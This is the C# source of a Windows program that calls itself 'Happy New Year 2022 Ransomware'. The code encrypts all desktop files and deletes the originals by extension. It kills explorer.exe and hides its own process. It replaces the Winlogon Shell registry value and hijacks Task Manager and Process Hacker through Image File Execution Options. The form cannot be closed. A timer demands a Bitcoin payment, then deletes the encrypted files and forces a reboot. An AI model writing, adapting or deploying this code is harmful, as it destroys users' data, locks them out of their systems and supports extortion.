using aLib.Microsoft;
using HappyNewYear2022Ransomware.Properties;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Net.Security;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace HappyNewYear2022Ransomware
{
    public partial class NewYear2022 : Form
    {
        public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
        {
            //This is Very Important Code... DON'T CHANGE THIS!!! 

            Assembly assembly = Assembly.GetCallingAssembly();

            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
            using (BinaryReader r = new BinaryReader(s))
            using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
            using (BinaryWriter w = new BinaryWriter(fs))
                w.Write(r.ReadBytes((int)s.Length));
        }
        public NewYear2022()
        {
            InitializeComponent();
            string path = @"C:\Temp";
            string sys = @"C:\Windows";
            Directory.CreateDirectory(path);
            Extract("HappyNewYear2022Ransomware", path, "Resources", "FLock.png");
            Extract("HappyNewYear2022Ransomware", path, "Resources", "HappyNewYear2022.mp3");
            Extract("HappyNewYear2022Ransomware", path, "Resources", "ProcessHider.exe");
            Extract("HappyNewYear2022Ransomware", sys, "Resources", "RuleBrokeHappyNewYear2022.exe");
            Extract("HappyNewYear2022Ransomware", path, "Resources", "Happy2022.exe");
            Extract("HappyNewYear2022Ransomware", sys, "Resources", "SantaClausWillKillYourPC.exe");
            Resources.FLock.Save(@"C:\Temp\FLock.png");
            string deletemp3 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string userRoot = Environment.GetEnvironmentVariable("USERPROFILE");
            ClockDelEncFiles();
            Start_Encrypt();
            DirectoryInfo di = new DirectoryInfo(deletemp3);
            FileInfo[] files = di.GetFiles("*.mp3");
            foreach (FileInfo ixx in files)
            {
                ixx.Attributes = FileAttributes.Normal;
                ixx.Delete();
            }
            ProcessStartInfo exp = new ProcessStartInfo();
            exp.FileName = "cmd.exe";
            exp.Verb = "runas";
            exp.Arguments = "/c taskkill /f /im explorer.exe";
            exp.WindowStyle = ProcessWindowStyle.Hidden;
            Process.Start(exp);
            ProcessStartInfo processhide = new ProcessStartInfo();
            processhide.FileName = "cmd.exe";
            processhide.Verb = "runas";
            processhide.Arguments = "/c ProcessHider -n \"HappyNewYear2022Ransomware.exe\"";
            processhide.WindowStyle = ProcessWindowStyle.Hidden;
            Process.Start(processhide);
            RegistryKey localMachine = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
            RegistryKey Shell = localMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true);
            Shell.DeleteValue("Shell");
            Shell.SetValue("Shell", "RuleBrokeHappyNewYear2022.exe", RegistryValueKind.String);
            RegistryKey rewtskmgr = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe");
            rewtskmgr.SetValue("Debugger", @"C:\Temp\Happy2022.exe", RegistryValueKind.String);
            RegistryKey rewprochacker = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ProcessHacker.exe");
            rewprochacker.SetValue("Debugger", @"C:\Temp\Happy2022.exe", RegistryValueKind.String);
            foreach (FileInfo xxx in files)
            {
                xxx.Delete();
            }
            if (File.Exists(@"C:\Temp\HappyNewYear2022.mp3"))
            {
                try
                {
                    this.Happy2022.uiMode = "none";
                    this.Happy2022.URL = @"C:\Temp\HappyNewYear2022.mp3";
                    this.Happy2022.settings.setMode("loop", true);
                    this.Happy2022.Visible = false;
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
                DirectoryInfo desk = new DirectoryInfo(deletemp3);
                FileInfo[] desktopinifile = di.GetFiles("desktop.ini");
                foreach (FileInfo deskfileini in desktopinifile)
                    try
                    {
                        deskfileini.Attributes = FileAttributes.Normal;
                        deskfileini.Delete();
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show("Error: " + ex.Message + Environment.NewLine + "Please Make sure Get Access to this File...", "Happy New Year 2022 Ransomware", MessageBoxButtons.OK, MessageBoxIcon.Stop);
                    }
                string exefolderdesktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                DirectoryInfo exedesk = new DirectoryInfo(exefolderdesktop);
                FileInfo[] desktopexe = exedesk.GetFiles("*.exe");
                foreach (FileInfo exexxxdesk in desktopexe)
                {
                    try
                    {
                        exexxxdesk.Attributes = FileAttributes.Normal;
                        exexxxdesk.Delete();
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show("Error: " + ex.Message, "Happy New Year 2022 Ransomware", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                    DirectoryInfo pdffiledelete = new DirectoryInfo(exefolderdesktop);
                    FileInfo[] pdffile = pdffiledelete.GetFiles("*.pdf");
                    foreach (FileInfo pdfdelete in pdffile)
                    {
                        pdfdelete.Attributes = FileAttributes.Normal;
                        pdfdelete.Delete();
                    }
                    DirectoryInfo mp4formatfile = new DirectoryInfo(exefolderdesktop);
                    FileInfo[] mp4del = mp4formatfile.GetFiles("*.mp4");
                    foreach (FileInfo mmp4delete in mp4del)
                    {
                        mmp4delete.Attributes = FileAttributes.Normal;
                        mmp4delete.Delete();
                    }
                    DirectoryInfo wavfile = new DirectoryInfo(exefolderdesktop);
                    FileInfo[] wavv = wavfile.GetFiles("*.wav");
                    foreach (FileInfo file in wavv)
                    {
                        file.Attributes = FileAttributes.Normal;
                        file.Delete();
                    }
                    DirectoryInfo textfiles = new DirectoryInfo(exefolderdesktop);
                    FileInfo[] gettextfiles = textfiles.GetFiles("*.txt");
                    foreach (FileInfo txt in gettextfiles)
                    {
                        txt.Attributes = FileAttributes.Normal;
                        txt.Delete();
                    }
                    DirectoryInfo jpegformat = new DirectoryInfo(exefolderdesktop);
                    FileInfo[] fileJPEG = jpegformat.GetFiles("*.jpg");
                    foreach (FileInfo jpgfile in fileJPEG)
                    {
                        jpgfile.Attributes = FileAttributes.Normal;
                        jpgfile.Delete();
                    }
                    DirectoryInfo pngfile = new DirectoryInfo(exefolderdesktop);
                    FileInfo[] filePNGinfo = pngfile.GetFiles("*.png");
                    foreach (FileInfo png123 in filePNGinfo)
                    {
                        png123.Attributes = FileAttributes.Normal;
                        png123.Delete();
                    }
                    DirectoryInfo rtf = new DirectoryInfo(exefolderdesktop);
                    if (rtf.Exists)
                    {
                        FileInfo[] fileRTF = rtf.GetFiles("*.rtf");
                        foreach (FileInfo rtf123 in fileRTF)
                        {
                            rtf123.Attributes = FileAttributes.Normal;
                            rtf123.Delete();
                        }
                    }
                    DirectoryInfo linkfolder = new DirectoryInfo(exefolderdesktop);
                    FileInfo[] lnkfold = linkfolder.GetFiles("*.lnk");
                    foreach (FileInfo lnk in lnkfold)
                    {
                        lnk.Attributes = FileAttributes.Normal;
                        lnk.Delete();
                    }
                    DirectoryInfo photoshop = new DirectoryInfo(exefolderdesktop);
                    FileInfo[] phot = photoshop.GetFiles("*.psd");
                    foreach (FileInfo psd in phot)
                    {
                        psd.Attributes = FileAttributes.Normal;
                        psd.Delete();
                    }
                }

            }
            
        }

        public void Start_Encrypt()
        {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string[] files = Directory.GetFiles(path + @"\", "*", SearchOption.AllDirectories);

            StartEncrypt enc = new StartEncrypt();

            string password = mm_Encryptions.Base64.ToString("HappyNewYear2022"); //this is password to decrypt your files :D
            for (int i = 0; i < files.Length; i++)
            {
                enc.FileEncrypt(files[i], password);
            }
        }
        private void NewYear2022_Load(object sender, EventArgs e)
        {
            Lock1.ImageLocation = @"C:\Temp\FLock.png";
            Lock2.ImageLocation = @"C:\Temp\FLock.png";
            Lock3.ImageLocation = @"C:\Temp\FLock.png";
            var NewForm = new ChristmasTree();
            NewForm.Show();
        }

        public class StartEncrypt
        {


            public static byte[] GenerateRandomSalt()
            {
                byte[] data = new byte[32];

                using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
                {
                    for (int i = 0; i < 10; i++)
                    {
                        // Fille the buffer with the generated data
                        rng.GetBytes(data);
                    }
                }

                return data;
            }
            public void FileEncrypt(string inputFile, string password)
            {
                //

                //Random Salt Generate
                byte[] salt = GenerateRandomSalt();

                //Output file 
                FileStream fsCrypt = new FileStream(inputFile + ".happynewyear2022", FileMode.Create);

                //convert password string to byte arrray
                byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);

                //Rijndael symmetric encryption algorithm
                RijndaelManaged AES = new RijndaelManaged();
                AES.KeySize = 256;
                AES.BlockSize = 128;
                AES.Padding = PaddingMode.PKCS7;
                var key = new Rfc2898DeriveBytes(passwordBytes, salt, 3500);
                AES.Key = key.GetBytes(AES.KeySize / 8);
                AES.IV = key.GetBytes(AES.BlockSize / 8);
                AES.Mode = CipherMode.CBC;

                // write salt to the begining of the output file, so in this case can be random every time
                fsCrypt.Write(salt, 0, salt.Length);

                CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write);

                FileStream fsIn = new FileStream(inputFile, FileMode.Open);

                //create a buffer (1mb) so only this amount will allocate in the memory and not the whole file
                byte[] buffer = new byte[1048576];
                int read;

                try
                {
                    while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
                    {
                        Application.DoEvents(); // -> for responsive GUI, using Task will be better!
                        cs.Write(buffer, 0, read);
                    }

                    // Close up
                    fsIn.Close();
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Error: " + ex.Message);
                }
                finally
                {
                    cs.Close();
                    fsCrypt.Close();
                }
            }



        }
        private void ClockDelEncFiles() //Clock Timer, if 5 hours is Ended, your files is DELETED ON FOREVER :D
        {
            TimertoExittothisapp.Enabled = true;
            TimertoExittothisapp.Start();
            var startTime = DateTime.Now;
            var timer = new Timer() { Interval = 1000 };
            timer.Tick += (obj, args) =>
            timertodeleteencfiles.Text =
            (TimeSpan.FromHours(5) - (DateTime.Now - startTime))
            .ToString("hh\\:mm\\:ss");
            timer.Enabled = true;
        }


        private void button1_Click(object sender, EventArgs e)
        {
            if(textBox1.Text == "")
            {
                MessageBox.Show("WRONG KEY!!!" + Environment.NewLine + "Try Again :D", "Happy New Year 2022 Ransomware", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else if(textBox1.Text == mm_Encryptions.Base64.ToString("HappyNewYear2022"))
            {
                MessageBox.Show("Key is Correct, Well Done", "Happy New Year 2022 Ransomware", MessageBoxButtons.OK, MessageBoxIcon.Information);
                Environment.Exit(0);
            }
            else
            {
                MessageBox.Show("WRONG KEY!!!" + Environment.NewLine + "Try Again :D", "Happy New Year 2022 Ransomware", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if(File.Exists(@"C:\Windows\System32\notepad.exe"))
            {
                try
                {
                    File.WriteAllText(@"C:\Temp\Rules.txt", "1. Don't Run Task Manager or Process Hacker, otherwise Task Manager or Process Hacker just don't run :D" + Environment.NewLine + "2. Don't Close this Ransomware!!!" + Environment.NewLine + "3. Don't Delete your Encrypted Files!!!" + Environment.NewLine + "Good Luck!!!");
                    Process.Start("notepad", @"C:\Temp\Rules.txt");
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Error: " + ex.Message, "Happy New Year 2022 Ransomware", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }

            }
        }

        private void NewYear2022_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
            if (e.CloseReason == CloseReason.UserClosing)
            {
                e.Cancel = true;
            }
            if(e.CloseReason == CloseReason.FormOwnerClosing)
            {
                e.Cancel = true;
            }
            if(e.CloseReason != CloseReason.TaskManagerClosing)
            {
                e.Cancel = true;
            }
        }

        private void TimertoExittothisapp_Tick(object sender, EventArgs e)
        {
            if (TimertoExittothisapp.Interval > 7200000)
            {
                MessageBox.Show("2 Hours is Remaining, and your files is not decrypted?!?!" + Environment.NewLine + "LOL :D", "Happy New Year 2022 Ransomware", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                MessageBox.Show("Just Send Me 0,0010 BTC in my Bitcoin Address and your files is decrypted :D", "Happy New Year 2022 Ransomware", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
            if (TimertoExittothisapp.Interval > 1000)
            {
                try
                {
                    RegistryKey mbroverwrite = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
                    RegistryKey regshell = mbroverwrite.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true);
                    regshell.DeleteValue("Shell");
                    regshell.SetValue("Shell", "SantaClausWillKillYourPC.exe");
                    MessageBox.Show("Time is Up... Your Encrypted Files is DELETED FOREVER :D", "Happy New Year 2022 Ransomware", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                    MessageBox.Show("Say Goodbye to your files and PC" + Environment.NewLine + "Your PC Will be Automatic Restarted", "Happy New Year 2022 Ransomware", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                    DirectoryInfo desktophap2022 = new DirectoryInfo(desktop);
                    FileInfo[] deleteencfiles = desktophap2022.GetFiles("*.happynewyear2022");
                    foreach (FileInfo deskhap in deleteencfiles)
                    {
                        deskhap.Delete();
                    }
                    Process.Start("shutdown", "/r /t 0");
                    Environment.Exit(-34214);
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Error: " + ex.Message, "Happy New Year 2022 Ransomware", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }
    }
}

